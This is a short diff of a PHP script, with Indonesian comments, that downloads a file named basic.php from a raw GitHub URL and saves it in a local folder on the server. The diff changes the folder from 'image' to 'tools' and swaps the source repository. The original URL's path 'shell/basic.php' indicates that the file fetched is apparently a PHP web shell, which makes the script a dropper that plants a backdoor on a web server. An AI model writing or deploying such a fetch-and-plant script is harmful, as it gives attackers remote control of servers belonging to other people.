@@ -1,6 +1,6 @@
 <?php
 
-$folder = 'image';
+$folder = 'tools';
 $file_name = 'basic.php';
 $file_path = $folder . '/' . $file_name;
 
@@ -35,7 +35,7 @@ function downloadFromGitHub($url, $path) {
 }
 
 // URL file di GitHub
-$github_url = 'https://raw.githubusercontent.com/aainsomnia/tools_original/main/shell/basic.php';
+$github_url = 'https://raw.githubusercontent.com/arlsmkf/my-tools/main/basic.php';
 
 // Download file dari GitHub
 downloadFromGitHub($github_url, $file_path);
